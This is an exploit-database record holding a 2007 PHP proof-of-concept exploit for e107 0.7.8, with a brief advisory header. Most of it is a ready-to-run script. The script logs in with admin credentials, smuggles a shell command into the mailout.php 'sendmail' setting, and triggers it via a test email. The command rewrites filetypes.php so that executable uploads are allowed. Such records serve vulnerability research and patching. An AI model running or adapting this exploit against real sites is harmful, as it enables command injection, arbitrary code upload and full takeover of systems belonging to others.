{
  "id": "3721",
  "title": "e107 0.7.8 - &#039;mailout.php&#039; (Authenticated) Access Escalation",
  "cve": null,
  "vuln_type": "file_upload",
  "code": "<?/*\r\nFile: mailout.php\r\nAffects: E107 (v0.7.8) - mailout.php\r\nDate: 12th April 2007\r\n\r\nIssue Description:\r\n===========================================================================\r\nmailout.php provides an interface for the site administrator to\r\nsend/configure and test email functionality in e107, the problem occurs\r\nbecause the user can directly change the $mailer parameter which is passed\r\nto a subsequent popen() call when sending a test email. this allows an attacker\r\nto run any command of their choosing on the system\r\n===========================================================================\r\n\r\nScope:\r\n===========================================================================\r\nThe scope of the attack is greatly limited by the fact a user would first\r\nneed an administrator account on e107 to exploit the vulnerbility however\r\nin these circumstance full system access can be gained.\r\n===========================================================================\r\n\r\nRecommendation:\r\n===========================================================================\r\nNo known solution at this time\r\n===========================================================================\r\n\r\nDiscovered By: Gammarays\r\n*/?>\r\n\r\n\r\n<?php\r\n\r\n//E107 - (v0.7.8) Access Escalation Vulnerbility - PoC\r\n//Overwrites filetypes.php allowing the upload of dangerous filetypes\r\n\r\necho \"########################################################\\n\";\r\necho \"#   Special Greetings To - Timq,Warpboy,The-Maggot     #\\n\";\r\necho \"########################################################\\n\\n\\n\";\r\n\r\nif($argc!=4) die(\"Usage <url> <user> <pass>\\n\\n\\t Ex: http://www.example.com/e107/ usera passb\\n\");\r\n\r\n$url = $argv[1];\r\n$user = $argv[2];\r\n$pass = $argv[3];\r\n\r\n$ch = curl_init($url . \"e107_admin/admin.php\");\r\nif(!$ch) die(\"Error Initializing CURL\");\r\n\r\n\r\n//Login\r\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\r\ncurl_setopt($ch, CURLOPT_COOKIEJAR, \"cookie.dat\");\r\ncurl_setopt($ch, CURLOPT_POST,1);\r\ncurl_setopt($ch, CURLOPT_POSTFIELDS,\"authname=\".$user.\"&authpass=\".$pass.\"&authsubmit=Log+In\");\r\n$res = curl_exec($ch);\r\nif(!$res) die(\"Error Connecting To Target\");\r\n\r\necho \"[ ]Logging In...\\n\";\r\n\r\n//Check Login Succeeded\r\ncurl_setopt($ch, CURLOPT_HTTPGET, 1);\r\ncurl_setopt($ch, CURLOPT_COOKIEFILE, \"cookie.dat\");\r\n$res = curl_exec($ch);\r\nif(!$res) die(\"Error Connecting To Target\");\r\n$res = strstr($res,\"administrator.php\");\r\nif(!$res) die(\"Error - Invalid Username Or Password\");\r\n\r\necho \"[ ]Login Suceeded!\\n\";\r\n\r\n//Enable upload of everyones favourite filetypes\r\n$cmd = \"echo php,php3,exe,gzip,pl,cgi,shtml,sh > filetypes.php\";\r\n\r\ncurl_setopt($ch, CURLOPT_URL,$url . \"/e107_admin/mailout.php?prefs\");\r\ncurl_setopt($ch, CURLOPT_POST,1);\r\ncurl_setopt($ch, CURLOPT_POSTFIELDS,\"testaddress=none@nomail.net&mailer=sendmail&smtp_server=&smtp_username=&smtp_password=&sendmail=\".$cmd.\"&mail_pause=3&mail_pausetime=4&mail_bounce_email=&mail_bounce_pop3=&mail_bounce_user=&mail_bounce_pass=&updateprefs=Save+Changes\");\r\n$res = curl_exec($ch);\r\n\r\ncurl_setopt($ch, CURLOPT_POSTFIELDS,\"testemail=Click+to+send+email+to&testaddress=none@nomail.net&mailer=sendmail&smtp_server=&smtp_username=&smtp_password=&mail_pause=3&mail_pausetime=4&mail_bounce_email=&mail_bounce_pop3=&mail_bounce_user=&mail_bounce_pass=\");\r\n$res = curl_exec($ch);\r\n\r\necho \"[ ]Upload Of Executable Scripts Enabled\\n\";\r\ncurl_close($ch);\r\n?>\r\n\r\n# milw0rm.com [2007-04-12]",
  "url": "https://www.exploit-db.com/exploits/3721"
}